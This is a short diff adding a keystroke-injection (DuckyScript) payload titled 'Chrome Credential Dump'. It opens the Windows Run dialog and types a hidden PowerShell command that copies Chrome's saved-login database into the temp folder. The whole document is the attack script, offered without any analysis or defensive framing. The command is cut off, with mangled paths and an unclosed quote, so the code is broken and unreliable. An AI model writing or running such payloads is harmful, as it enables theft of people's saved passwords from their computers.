@@ -1,0 +1,4 @@
+REM Chrome Credential Dump
+GUI r
+DELAY 200
+STRING powershell -W Hidden -C "$p=%LOCALAPPDATA%GoogleChromeUser DataDefaultLogin Data;Copy-Item $p $env:TEMP
